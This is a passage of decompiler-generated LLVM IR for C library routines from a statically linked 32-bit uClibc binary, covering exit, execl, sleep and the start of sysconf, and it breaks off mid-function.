  %tmp57 = icmp ugt i8 %v1_8055105, %v1_80550d2
  br i1 %tmp57, label %dec_label_pc_805510b, label %dec_label_pc_8055123

dec_label_pc_805510b:                             ; preds = %dec_label_pc_8055105, %dec_label_pc_80550fe
  store i32 %v4_805510b, i32* %eax.global-to-local, align 4
  %v6_805510f = and i8 %stack_var_-18.2, %tmp37
  %v1_8055113 = sext i8 %v6_805510f to i32
  %v2_8055113 = call i32 @__errno_location(i32 %v1_8055113)
  store i32 %v2_8055113, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_805511b = inttoptr i32 %v2_8055113 to i32*
  store i32 34, i32* %v1_805511b, align 4
  %v0_80550dc.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_80550de.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_80550e0.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80550dc

dec_label_pc_8055123:                             ; preds = %dec_label_pc_8055105, %dec_label_pc_8055103
  %v4_8055123 = mul i32 %v0_80550ff, %v1_80550fa
  store i32 %v1_80550f7, i32* %eax.global-to-local, align 4
  %v2_8055129 = add i32 %v4_8055123, %v1_80550f7
  store i32 %v2_8055129, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550dc

dec_label_pc_805512d:                             ; preds = %dec_label_pc_80550f7, %dec_label_pc_80550c1
  %v0_8055138 = phi i32 [ %v0_805513823, %dec_label_pc_80550c1 ], [ %v0_805513821, %dec_label_pc_80550f7 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_80550c1 ], [ %stack_var_-18.2, %dec_label_pc_80550f7 ]
  %v4_805512d = icmp eq i32 %arg2, 0
  br i1 %v4_805512d, label %dec_label_pc_805513a, label %dec_label_pc_8055134

dec_label_pc_8055134:                             ; preds = %dec_label_pc_805512d
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8055138 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8055138, i32* %v2_8055138, align 4
  br label %dec_label_pc_805513a

dec_label_pc_805513a:                             ; preds = %dec_label_pc_805512d, %dec_label_pc_8055134
  %v8_805513a = icmp eq i8 %stack_var_-18.3, 0
  %v2_805513f = zext i1 %v8_805513a to i32
  %v13_805513f = icmp eq i1 %v8_805513a, false
  %v1_80551413 = or i32 %v2_805513f, -2147483648
  store i32 %v1_80551413, i32* %ebx.global-to-local, align 4
  %v5_8055147 = icmp eq i8 %tmp37, 0
  br i1 %v5_8055147, label %dec_label_pc_805515f, label %dec_label_pc_805514e

dec_label_pc_805514e:                             ; preds = %dec_label_pc_805513a
  %v0_805514e = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_805514e, %v1_80551413
  br i1 %tmp58, label %dec_label_pc_8055152, label %dec_label_pc_805515f

dec_label_pc_8055152:                             ; preds = %dec_label_pc_805514e
  %v1_8055152 = sext i8 %stack_var_-18.3 to i32
  %v2_8055152 = call i32 @__errno_location(i32 %v1_8055152)
  store i32 %v2_8055152, i32* %eax.global-to-local, align 4
  %v0_8055157 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055157, i32* %edx.global-to-local, align 4
  %v1_8055159 = inttoptr i32 %v2_8055152 to i32*
  store i32 34, i32* %v1_8055159, align 4
  br label %dec_label_pc_805515f

dec_label_pc_805515f:                             ; preds = %dec_label_pc_805514e, %dec_label_pc_805513a, %dec_label_pc_8055152
  %v0_805515f = load i32, i32* %edx.global-to-local, align 4
  %v1_8055161 = sub i32 0, %v0_805515f
  %v4_8055168 = select i1 %v13_805513f, i32 %v1_8055161, i32 %v0_805515f
  store i32 %v4_8055168, i32* @edx, align 4
  %v2_805516e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805516e, i32* @ebx, align 4
  store i32 %v4_8055168, i32* %eax.global-to-local, align 4
  ret i32 %v4_8055168

; uselistorder directives
  uselistorder i32 %v4_8055168, { 1, 0, 2 }
  uselistorder i1 %v8_805513a, { 1, 0 }
  uselistorder i8 %v6_805510f, { 1, 0 }
  uselistorder i32 %v1_80550ff, { 1, 0 }
  uselistorder i32 %v0_80550ff, { 2, 1, 0 }
  uselistorder i32 %v1_80550fe, { 1, 0 }
  uselistorder i32 %v2_80550fa, { 1, 0 }
  uselistorder i32 %v1_80550f7, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8055126, { 2, 0, 1 }
  uselistorder i8 %v2_80550ea, { 1, 0, 2 }
  uselistorder i32 %v14_80550e2, { 0, 2, 1 }
  uselistorder i32 %v0_80550dc, { 1, 0 }
  uselistorder i32 %v0_80550d0, { 1, 0, 2 }
  uselistorder i32 %v3_80550be, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80550b3, { 1, 0 }
  uselistorder i32 %v1_80550a6, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_80550a5, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_805506e.lcssa, { 1, 0 }
  uselistorder i32 %v0_805506d.lcssa, { 1, 0 }
  uselistorder i32 %v1_805506d, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8055063, { 1, 0, 2 }
  uselistorder i32 %v4_805505b, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805515f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805513a, { 1, 0 }
  uselistorder label %dec_label_pc_80550f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80550de, { 1, 0 }
  uselistorder label %dec_label_pc_80550c1, { 1, 0 }
  uselistorder label %dec_label_pc_80550b6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055093, { 1, 0 }
  uselistorder label %dec_label_pc_8055092, { 1, 0 }
  uselistorder label %dec_label_pc_805506d, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805518b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805518b, i32* @ebx, align 4
  %v2_8055190 = call i32 @__pthread_return_void(i32 %v2_805518b, i32 134567263)
  %v1_805519c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e420.554 to i32))
  %v0_80551a1 = load i32, i32* @global_var_80646c4.555, align 4
  store i32 %v0_80551a1, i32* @eax, align 4
  %v1_80551a9 = icmp eq i32 %v0_80551a1, 0
  br i1 %v1_80551a9, label %dec_label_pc_80551b6, label %dec_label_pc_80551ad

dec_label_pc_80551ad:                             ; preds = %entry
  %v0_80551b0 = load i32, i32* @esi, align 4
  %v1_80551b1 = call i32 @unknown_0(i32 %v0_80551b0)
  store i32 %v1_80551b1, i32* @eax, align 4
  br label %dec_label_pc_80551b6

dec_label_pc_80551b6:                             ; preds = %entry, %dec_label_pc_80551ad
  %v2_80551bb = call i32 @__pthread_return_void(i32 %v2_805518b, i32 1)
  %v0_80551c0 = call i32 @__GI___uClibc_fini()
  %v0_80551d1 = call i32 @_stdio_term()
  %v0_80551d9 = load i32, i32* @esi, align 4
  %v1_80551da = call i32 @__GI__exit(i32 %v0_80551d9)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 3, 0, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder label %dec_label_pc_80551b6, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80551e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80551e6, i32* %stack_var_-12, align 4
  %v2_80551e7 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80551e7, i32* %eax.global-to-local, align 4
  %v12_80551ea = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80551f0

dec_label_pc_80551f0:                             ; preds = %dec_label_pc_80551f0, %entry
  %v0_80551f3 = phi i32 [ 0, %entry ], [ %v1_80551f3, %dec_label_pc_80551f0 ]
  %stack_var_-16.0 = phi i32 [ %v2_80551e7, %entry ], [ %v1_80551f4, %dec_label_pc_80551f0 ]
  %v1_80551f3 = add i32 %v0_80551f3, 1
  store i32 %v1_80551f3, i32* %esi.global-to-local, align 4
  %v1_80551f4 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80551f4, i32* %eax.global-to-local, align 4
  %v1_80551fa = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80551fa = load i32, i32* %v1_80551fa, align 4
  %v3_80551fa = icmp eq i32 %v2_80551fa, 0
  %v1_80551fd = icmp eq i1 %v3_80551fa, false
  br i1 %v1_80551fd, label %dec_label_pc_80551f0, label %dec_label_pc_80551ff

dec_label_pc_80551ff:                             ; preds = %dec_label_pc_80551f0
  %v1_80551ff = mul i32 %v1_80551f3, 4
  %v2_80551ff = add i32 %v1_80551ff, 34
  %v1_8055206 = and i32 %v2_80551ff, -16
  %v2_8055209 = sub i32 %v12_80551ea, %v1_8055206
  %v1_805520e = add i32 %v2_8055209, 15
  %v1_8055212 = and i32 %v1_805520e, -16
  store i32 %v1_8055212, i32* @ebx, align 4
  store i32 %v1_8055212, i32* %ecx.global-to-local, align 4
  %v2_8055217 = inttoptr i32 %v1_8055212 to i32*
  store i32 %arg2, i32* %v2_8055217, align 16
  store i32 %v2_80551e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805521f

dec_label_pc_805521f:                             ; preds = %dec_label_pc_805521f, %dec_label_pc_80551ff
  %stack_var_-16.1 = phi i32 [ %v2_80551e7, %dec_label_pc_80551ff ], [ %v1_8055226, %dec_label_pc_805521f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8055222 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055222 = add i32 %v0_8055222, 4
  store i32 %v1_8055222, i32* %ecx.global-to-local, align 4
  %v0_8055225 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055225 = add i32 %v0_8055225, -1
  %v8_8055225 = icmp eq i32 %v1_8055225, 0
  store i32 %v1_8055225, i32* %esi.global-to-local, align 4
  %v1_8055226 = add i32 %stack_var_-16.1, 4
  %v1_805522c = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_805522c = load i32, i32* %v1_805522c, align 4
  store i32 %v2_805522c, i32* %eax.global-to-local, align 4
  %v2_805522e = inttoptr i32 %v1_8055222 to i32*
  store i32 %v2_805522c, i32* %v2_805522e, align 4
  %v1_8055230 = icmp eq i1 %v8_8055225, false
  br i1 %v1_8055230, label %dec_label_pc_805521f, label %dec_label_pc_8055232

dec_label_pc_8055232:                             ; preds = %dec_label_pc_805521f
  %v0_8055232 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055232 = load i32, i32* @esp, align 4
  %v2_8055232 = add i32 %v1_8055232, -4
  %v3_8055232 = inttoptr i32 %v2_8055232 to i32*
  store i32 %v0_8055232, i32* %v3_8055232, align 4
  %v0_8055233 = load i32, i32* @global_var_80646cc.556, align 4
  %v2_8055233 = add i32 %v1_8055232, -8
  %v3_8055233 = inttoptr i32 %v2_8055233 to i32*
  store i32 %v0_8055233, i32* %v3_8055233, align 4
  %v0_8055239 = load i32, i32* @ebx, align 4
  %v2_8055239 = add i32 %v1_8055232, -12
  %v3_8055239 = inttoptr i32 %v2_8055239 to i32*
  store i32 %v0_8055239, i32* %v3_8055239, align 4
  %v5_805523a = add i32 %v1_8055232, -16
  %v6_805523a = inttoptr i32 %v5_805523a to i32*
  store i32 %arg1, i32* %v6_805523a, align 4
  %v1_805523d = inttoptr i32 %v1_8055226 to i8*
  %v2_805523d = call i32 @__GI_execve(i8* %v1_805523d)
  store i32 %v2_805523d, i32* %eax.global-to-local, align 4
  %v2_8055245 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055245, i32* @ebx, align 4
  ret i32 %v2_805523d

; uselistorder directives
  uselistorder i32 %v1_8055225, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80551f4, { 1, 0 }
  uselistorder i32 %v1_80551f3, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80551e7, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_805524c = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8055252 = load i32, i32* @edi, align 4
  %v0_8055253 = load i32, i32* @esi, align 4
  %v0_8055254 = load i32, i32* @ebx, align 4
  %v15_8055255 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_8055262 = icmp eq i32 %arg1, 0
  %v1_8055264 = icmp eq i1 %v1_8055262, false
  br i1 %v1_8055264, label %dec_label_pc_8055276.preheader, label %dec_label_pc_80553c3

dec_label_pc_8055276.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805526b

dec_label_pc_805526b:                             ; preds = %dec_label_pc_805526b.dec_label_pc_805526b_crit_edge, %dec_label_pc_8055276.preheader
  %v0_805526b = phi i32 [ %v15_8055255, %dec_label_pc_8055276.preheader ], [ %v0_805526b.pre, %dec_label_pc_805526b.dec_label_pc_805526b_crit_edge ]
  %v1_805527629 = phi i32 [ 31, %dec_label_pc_8055276.preheader ], [ %v1_8055276, %dec_label_pc_805526b.dec_label_pc_805526b_crit_edge ]
  %v2_805526b = mul i32 %v1_805527629, 4
  %v3_805526b = add i32 %v2_805526b, 292
  %v4_805526b = add i32 %v3_805526b, %v0_805526b
  %v5_805526b = inttoptr i32 %v4_805526b to i32*
  store i32 0, i32* %v5_805526b, align 4
  %v0_8055276.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8055276 = add i32 %v0_8055276.pre, -1
  %v9_8055276 = icmp slt i32 %v1_8055276, 0
  store i32 %v1_8055276, i32* %eax.global-to-local, align 4
  %v1_8055277 = icmp eq i1 %v9_8055276, false
  br i1 %v1_8055277, label %dec_label_pc_805526b.dec_label_pc_805526b_crit_edge, label %dec_label_pc_8055279

dec_label_pc_805526b.dec_label_pc_805526b_crit_edge: ; preds = %dec_label_pc_805526b
  %v0_805526b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805526b

dec_label_pc_8055279:                             ; preds = %dec_label_pc_805526b
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805528f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805528f, i32* @ebx, align 4
  store i32 %v2_805528f, i32* %stack_var_-460, align 4
  %v4_8055297 = call i32 @__sigaddset(i32 %v2_805528f, i32 17, i32 %v1_8055276, i32 %v1_8055276)
  store i32 %v4_8055297, i32* %eax.global-to-local, align 4
  %v2_805529f = icmp slt i32 %v4_8055297, 0
  br i1 %v2_805529f, label %dec_label_pc_80553c7, label %dec_label_pc_80552a7

dec_label_pc_80552a7:                             ; preds = %dec_label_pc_8055279
  %v2_80552a8 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80552a8, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80552b3 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80552b3 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80552b3, i32 %v2_80552a8)
  store i32 %v4_80552b3, i32* %eax.global-to-local, align 4
  %v1_80552bb = icmp eq i32 %v4_80552b3, 0
  %v1_80552bd = icmp eq i1 %v1_80552bb, false
  br i1 %v1_80552bd, label %dec_label_pc_80553c7, label %dec_label_pc_80552c3

dec_label_pc_80552c3:                             ; preds = %dec_label_pc_80552a7
  store i32 %v2_80552a8, i32* %stack_var_-460, align 4
  %v4_80552c8 = call i32 @__sigismember(i32 %v2_80552a8, i32 17, i32 %v4_80552b3, i32 %v4_80552b3)
  store i32 %v4_80552c8, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80552d5 = icmp eq i32 %v4_80552c8, 0
  br i1 %v1_80552d5, label %dec_label_pc_80552e9.preheader, label %dec_label_pc_8055391

dec_label_pc_80552e9.preheader:                   ; preds = %dec_label_pc_80552c3
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80552de

dec_label_pc_80552de:                             ; preds = %dec_label_pc_80552de.dec_label_pc_80552de_crit_edge, %dec_label_pc_80552e9.preheader
  %v0_80552de = phi i32 [ %v15_8055255, %dec_label_pc_80552e9.preheader ], [ %v0_80552de.pre, %dec_label_pc_80552de.dec_label_pc_80552de_crit_edge ]
  %v1_80552e928 = phi i32 [ 31, %dec_label_pc_80552e9.preheader ], [ %v1_80552e9, %dec_label_pc_80552de.dec_label_pc_80552de_crit_edge ]
  %v2_80552de = mul i32 %v1_80552e928, 4
  %v3_80552de = add i32 %v2_80552de, 292
  %v4_80552de = add i32 %v3_80552de, %v0_80552de
  %v5_80552de = inttoptr i32 %v4_80552de to i32*
  store i32 0, i32* %v5_80552de, align 4
  %v0_80552e9.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80552e9 = add i32 %v0_80552e9.pre, -1
  %v9_80552e9 = icmp slt i32 %v1_80552e9, 0
  store i32 %v1_80552e9, i32* %edx.global-to-local, align 4
  %v1_80552ea = icmp eq i1 %v9_80552e9, false
  br i1 %v1_80552ea, label %dec_label_pc_80552de.dec_label_pc_80552de_crit_edge, label %dec_label_pc_80552ec

dec_label_pc_80552de.dec_label_pc_80552de_crit_edge: ; preds = %dec_label_pc_80552de
  %v0_80552de.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80552de

dec_label_pc_80552ec:                             ; preds = %dec_label_pc_80552de
  store i32 %v2_805528f, i32* %eax.global-to-local, align 4
  store i32 %v2_805528f, i32* %stack_var_-460, align 4
  %v4_80552f8 = call i32 @__sigaddset(i32 %v2_805528f, i32 17, i32 0, i32 0)
  store i32 %v4_80552f8, i32* %eax.global-to-local, align 4
  %v2_8055300 = icmp slt i32 %v4_80552f8, 0
  br i1 %v2_8055300, label %dec_label_pc_80553c7, label %dec_label_pc_8055308

dec_label_pc_8055308:                             ; preds = %dec_label_pc_80552ec
  %v2_8055309 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8055309, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8055312 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8055309)
  store i32 %v4_8055312, i32* %eax.global-to-local, align 4
  %v2_805531a = icmp slt i32 %v4_8055312, 0
  %v1_805531c = icmp eq i1 %v2_805531a, false
  br i1 %v1_805531c, label %dec_label_pc_8055346, label %dec_label_pc_805531e

dec_label_pc_805531e:                             ; preds = %dec_label_pc_8055308
  %v0_805531e = load i32, i32* %stack_var_-460, align 4
  %v1_805531e = call i32 @__errno_location(i32 %v0_805531e)
  store i32 %v1_805531e, i32* %eax.global-to-local, align 4
  %v1_8055323 = inttoptr i32 %v1_805531e to i32*
  %v2_8055323 = load i32, i32* %v1_8055323, align 4
  store i32 %v2_8055323, i32* @esi, align 4
  store i32 %v1_805531e, i32* @ebx, align 4
  store i32 %v2_80552a8, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8055334 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8055334 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055334, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805533f = load i32, i32* @esi, align 4
  %v1_805533f = load i32, i32* @ebx, align 4
  %v2_805533f = inttoptr i32 %v1_805533f to i32*
  store i32 %v0_805533f, i32* %v2_805533f, align 4
  %v0_80553d4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80553ca

dec_label_pc_8055346:                             ; preds = %dec_label_pc_8055308
  %v3_8055346 = load i32, i32* %stack_var_-420, align 4
  %v12_8055346 = icmp eq i32 %v3_8055346, 1
  %v2_8055352 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8055352, i32* @ebx, align 4
  %v1_8055359 = icmp eq i1 %v12_8055346, false
  br i1 %v1_8055359, label %dec_label_pc_8055380, label %dec_label_pc_805535b

dec_label_pc_805535b:                             ; preds = %dec_label_pc_8055346
  %v0_805535b = load i32, i32* @edi, align 4
  store i32 %v2_8055352, i32* %stack_var_-460, align 4
  %v4_805535f = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805535f = call i32 @__libc_nanosleep(%timespec* %v4_805535f, i32 %v2_8055352, i32 %v0_805535b, i32 %v0_805535b)
  store i32 %v5_805535f, i32* %eax.global-to-local, align 4
  store i32 %v5_805535f, i32* @edi, align 4
  %v1_8055366 = call i32 @__errno_location(i32 %v2_8055352)
  store i32 %v1_8055366, i32* %eax.global-to-local, align 4
  %v1_805536e = inttoptr i32 %v1_8055366 to i32*
  %v2_805536e = load i32, i32* %v1_805536e, align 4
  store i32 %v2_805536e, i32* @esi, align 4
  store i32 %v1_8055366, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8055377 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8055377 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055377, i32 0)
  store i32 %v4_8055377, i32* %eax.global-to-local, align 4
  %v0_805537c = load i32, i32* @esi, align 4
  %v1_805537c = load i32, i32* @ebx, align 4
  %v2_805537c = inttoptr i32 %v1_805537c to i32*
  store i32 %v0_805537c, i32* %v2_805537c, align 4
  %v0_80553a6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80553a3

dec_label_pc_8055380:                             ; preds = %dec_label_pc_8055346
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8055386 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8055386 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055386, i32 0)
  store i32 %v4_8055386, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805539c

dec_label_pc_8055391:                             ; preds = %dec_label_pc_80552c3
  %v2_8055393 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8055393, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805539c

dec_label_pc_805539c:                             ; preds = %dec_label_pc_8055380, %dec_label_pc_8055391
  %storemerge3.pre-phi = phi i32 [ %v2_8055352, %dec_label_pc_8055380 ], [ %v2_8055393, %dec_label_pc_8055391 ]
  %v3_805539c = phi i32 [ %v2_80552a8, %dec_label_pc_8055380 ], [ %v4_80552c8, %dec_label_pc_8055391 ]
  %v2_805539c = phi i32 [ 0, %dec_label_pc_8055380 ], [ %v4_80552c8, %dec_label_pc_8055391 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_805539c = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805539c = call i32 @__libc_nanosleep(%timespec* %v4_805539c, i32 %storemerge3.pre-phi, i32 %v2_805539c, i32 %v3_805539c)
  store i32 %v5_805539c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80553a3

dec_label_pc_80553a3:                             ; preds = %dec_label_pc_805535b, %dec_label_pc_805539c
  %v0_80553a6 = phi i32 [ %v0_80553a6.pre, %dec_label_pc_805535b ], [ %v5_805539c, %dec_label_pc_805539c ]
  %v1_80553a6 = icmp eq i32 %v0_80553a6, 0
  br i1 %v1_80553a6, label %dec_label_pc_80553c3, label %dec_label_pc_80553aa

dec_label_pc_80553aa:                             ; preds = %dec_label_pc_80553a3
  %v4_80553ba = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80553ba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80553ca

dec_label_pc_80553c3:                             ; preds = %entry, %dec_label_pc_80553a3
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80553ca

dec_label_pc_80553c7:                             ; preds = %dec_label_pc_80552ec, %dec_label_pc_80552a7, %dec_label_pc_8055279
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80553ca

dec_label_pc_80553ca:                             ; preds = %dec_label_pc_80553c3, %dec_label_pc_80553aa, %dec_label_pc_805531e, %dec_label_pc_80553c7
  %v0_80553d4 = phi i32 [ 0, %dec_label_pc_80553c3 ], [ %v4_80553ba, %dec_label_pc_80553aa ], [ %v0_80553d4.pre, %dec_label_pc_805531e ], [ -1, %dec_label_pc_80553c7 ]
  store i32 %v0_8055254, i32* @ebx, align 4
  store i32 %v0_8055253, i32* @esi, align 4
  store i32 %v0_8055252, i32* @edi, align 4
  store i32 %v0_805524c, i32* @ebp, align 4
  ret i32 %v0_80553d4

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8055366, { 1, 0, 2 }
  uselistorder i32 %v2_8055352, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80552e9, { 2, 1, 0 }
  uselistorder i32 %v4_80552c8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80552a8, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_805528f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8055276, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80553ca, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80553c3, { 1, 0 }
  uselistorder label %dec_label_pc_80553a3, { 1, 0 }
  uselistorder label %dec_label_pc_805539c, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80553f7 [
    i32 0, label %dec_label_pc_8055407
    i32 1, label %dec_label_pc_80554ec
    i32 2, label %dec_label_pc_8055411
    i32 3, label %dec_label_pc_805541b
    i32 4, label %dec_label_pc_8055425
    i32 5, label %dec_label_pc_80554bb
    i32 6, label %dec_label_pc_805542d
    i32 7, label %dec_label_pc_80553ed
    i32 8, label %dec_label_pc_80553ed
    i32 9, label %dec_label_pc_80553ed
    i32 10, label %dec_label_pc_80553ed
    i32 11, label %dec_label_pc_80553ed
    i32 12, label %dec_label_pc_80553ed
    i32 13, label %dec_label_pc_80553ed
    i32 14, label %dec_label_pc_80553ed
    i32 15, label %dec_label_pc_80553ed
    i32 16, label %dec_label_pc_80553ed
    i32 17, label %dec_label_pc_80553ed
    i32 18, label %dec_label_pc_80553ed
    i32 19, label %dec_label_pc_80553ed
    i32 20, label %dec_label_pc_80553ed
    i32 21, label %dec_label_pc_80553ed
    i32 22, label %dec_label_pc_80553ed
    i32 23, label %dec_label_pc_80554ec
    i32 24, label %dec_label_pc_80554ec
    i32 25, label %dec_label_pc_80554f8
    i32 26, label %dec_label_pc_80554c9
    i32 27, label %dec_label_pc_80554ec
    i32 28, label %dec_label_pc_805543f
    i32 29, label %dec_label_pc_80554c2
    i32 30, label %dec_label_pc_8055437
    i32 31, label %dec_label_pc_80554d7
    i32 32, label %dec_label_pc_80554ec
    i32 33, label %dec_label_pc_80554ec
    i32 34, label %dec_label_pc_80554ec
    i32 35, label %dec_label_pc_80554d0
    i32 36, label %dec_label_pc_80554ff
    i32 37, label %dec_label_pc_8055506
    i32 38, label %dec_label_pc_80554ff
    i32 39, label %dec_label_pc_8055449
    i32 40, label %dec_label_pc_805550d
    i32 41, label %dec_label_pc_80554ec
    i32 42, label %dec_label_pc_80554d7
